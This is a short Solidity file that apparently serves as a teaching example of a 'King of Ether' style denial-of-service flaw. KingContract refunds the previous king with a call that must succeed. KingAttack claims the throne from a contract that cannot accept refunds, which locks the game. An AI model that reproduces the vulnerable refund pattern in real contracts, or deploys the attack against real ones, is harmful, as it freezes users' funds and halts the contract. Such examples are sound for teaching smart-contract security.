// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title KingContract
/// @notice A contract that allows users to claim the throne by paying a higher value than the current king.
contract KingContract {
    address public king;
    uint public balance;

    /// @notice Claims the throne by paying a higher value than the current king.
    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        // Transfers the previous king's balance to the previous king.
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        // Updates the contract's balance and sets the new king.
        balance = msg.value;
        king = msg.sender;
    }
}

/// @title KingAttack
/// @notice A contract representing an attack on the KingContract by attempting to claim the throne.
contract KingAttack {
    KingContract target;

    /// @notice Constructs the KingAttack contract, specifying the target contract.
    /// @param _target The address of the KingContract contract to attack.
    constructor(KingContract _target) {
        target = KingContract(_target);
    }

    /// @notice Initiates the attack by calling the claimThrone function of the target contract with the specified value.
    function attack() public payable {
        target.claimThrone{value: msg.value}();
    }
}
